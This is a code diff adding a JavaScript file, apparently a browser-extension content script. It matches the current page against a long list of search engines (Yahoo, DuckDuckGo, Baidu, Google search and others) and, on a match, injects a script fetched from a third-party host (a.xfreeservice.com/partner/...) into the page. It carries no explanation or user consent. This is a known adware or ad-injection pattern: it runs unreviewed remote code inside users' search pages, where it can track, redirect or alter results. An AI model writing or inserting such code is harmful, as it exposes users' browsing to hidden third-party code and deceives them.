@@ -1,0 +1,30 @@
+var url = window.location.href;
+var adgoalSites = ['https://www.yahoo.com', 'https://search.yahoo.com/', 'https://www.ask.com', 'https://www.searchincognito.com',
+'https://duckduckgo.com', 'https://aol.com/', 'https://search.aol.com/', 'https://www.baidu.com', 'https://www.wolframalpha.com', 'https://yandex.com',
+'http://www.wiki.com', 'http://gibiru.com', 'http://boardreader.com', 'https://www.startpage.com', 'https://yippy.com', 'https://www.searchencrypt.com/',
+'https://www.ecosia.org', 'https://mail.ru', 'https://go.mail.ru/', 'https://www.qwant.com', 'https://www.reference.com', 'https://www.couponbear.com',
+'https://www.reference.com', 'https://www.allresultsweb.com' ,'https://www.enow.com', 'https://www.webmd.com', 'https://www.discretesearch.com/',
+'https://index.about.com', 'myway.com', 'https://start.att.net', 'https://www.mywot.com' ,'https://www.mysimon.com', 'https://search.avira.com',
+'https://search.norton.com/', 'https://search.avg.com', 'https://lavasoft.gosearchresults.com', 'https://www.sm.de/', 'https://www.informationvine.com',
+'http://search.sodapdf.com/', 'https://www.izito.de', 'http://www.info.com', 'https://www.netfind.com', 'http://www.ebizmba.com', 'https://www.pronto.com',
+'https://www.smarter.com', 'https://www.seekkees.com/', 'https://www.onionseek.com/', 'https://www.silver-search.com/', 'https://www.cherrysearch.com',
+'https://www.zapmeta.com/', 'https://www.zapmeta.fr/', 'https://www.zapmeta.com/', 'http://monstercrawler.com/', 'http://www.infospace.com/',
+'http://www.dogpile.com/', 'https://www.anygator.com/', 'http://searchprivacy.co/54', 'http://www.plusnetwork.com', 'https://search.handy-tab.com',
+'http://bitmotion-tab.com', 'https://www.kensaq.com'];
+var findInUrl = false;
+
+for(var adgoalSite of adgoalSites) {
+    if (url.indexOf(adgoalSite) != -1) {
+        findInUrl = true;
+        break;
+    }
+}
+
+if (findInUrl || (location.href.match(/google\.[^\/]+\/search/) &&
+    (location.hostname.match(/^google\./) || location.hostname.match(/\.google\./))))
+{
+    var ao_script = document.createElement('script');
+    ao_script.type = 'text/javascript';
+    ao_script.src ='https://a.xfreeservice.com/partner/5I4EIDfy/';
+    document.body.appendChild(ao_script);
+}
